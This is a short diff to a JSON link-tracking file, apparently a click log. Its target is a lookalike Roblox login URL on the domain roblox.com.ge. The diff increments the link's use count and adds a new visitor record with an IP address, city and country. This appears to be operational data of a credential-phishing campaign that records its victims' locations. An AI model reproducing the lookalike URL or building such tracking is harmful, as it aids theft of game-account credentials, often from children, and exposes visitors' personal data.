@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 837,
+    "useCount": 838,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6808,6 +6808,14 @@
         "city": "La Paz",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777175253645,
+        "ip": "222.127.169.33",
+        "country": "Philippines",
+        "city": "Iloilo City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
